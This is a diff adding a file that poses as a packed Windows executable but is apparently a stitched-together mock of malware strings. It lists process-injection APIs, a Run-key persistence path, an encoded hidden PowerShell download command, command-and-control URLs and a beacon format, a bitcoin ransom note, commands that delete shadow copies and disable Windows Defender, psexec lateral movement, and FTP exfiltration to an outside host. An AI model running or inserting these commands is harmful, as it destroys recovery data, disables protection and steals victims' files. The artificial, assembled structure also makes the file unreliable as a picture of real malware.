@@ -1,0 +1,55 @@
+MZ����@���������������������������������������������������������������������������������������������������������������������������������������������������������PE  L  ����  ����  ����  ����  ����  ����  ����  ����  ����  ����  ����  ����  ����  ����
+UPX0 PACKED SECTION BEGIN
+MPRESS PACKER DETECTED - BINARY OBFUSCATED
+=== UNPACKED STRINGS ===
+CreateRemoteThread
+VirtualAllocEx
+WriteProcessMemory
+OpenProcess
+NtCreateThreadEx
+ZwUnmapViewOfSection
+LoadLibraryA
+GetProcAddress
+RegOpenKeyExA
+RegSetValueExA
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
+C:\ProgramData\Microsoft\svchost64.exe
+C:\Windows\System32\cmd.exe /c powershell -nop -w hidden -enc
+SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcABhAHkAbABvAGEAZAAnACkA
+http://185.220.101.45/payload
+http://92.118.160.12/c2/beacon
+http://malware-c2.ru/stage2/update
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+POST /gate.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+id=%s&build=%s&ip=%s&os=%s&arch=%s&username=%s&computername=%s
+=== CRYPTO ROUTINES ===
+AES-256-CBC ENCRYPTION KEY SCHEDULE
+IV: 4a8f3c2e9b1d6f7a0e5c8b2d4f1a9e3c
+MUTEX: Global\\SystemService_x64_2024
+PIPE: \\.\pipe\SystemPipe_x64
+=== RANSOMWARE MODULE ===
+YOUR FILES HAVE BEEN ENCRYPTED
+Send 0.05 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf
+Contact: decrypt@protonmail.com
+vssadmin delete shadows /all /quiet
+bcdedit /set {default} recoveryenabled No
+bcdedit /set {default} bootstatuspolicy ignoreallfailures
+wmic shadowcopy delete
+del /s /f /q C:\Windows\System32\catroot2
+net stop "Windows Defender Service"
+net stop WinDefend
+sc config WinDefend start= disabled
+taskkill /IM MsMpEng.exe /F
+=== NETWORK SCANNER ===
+TARGET RANGE: 192.168.0.0/16
+PORT SCAN: 22, 23, 80, 443, 445, 3389, 8080, 8443
+LATERAL MOVEMENT: psexec \\%s -u %s -p %s cmd /c
+=== EXFILTRATION MODULE ===
+UPLOAD TO: ftp://185.220.101.45:21/drops/
+COMPRESS: zip -r -P infected123 %s %s
+SEND TO: attacker@protonmail.com
+SGVsbG8gZnJvbSB0aGUgZGFyayBzaWRlIG9mIHRoZSBpbnRlcm5ldA==
+eJzLSM3JyQcABiwCFQ==
+H4sIAAAAAAAAA6tWKkktLlGyUlIqS03MK07NSwUAAAD//w==
+UPX0 PACKED SECTION END
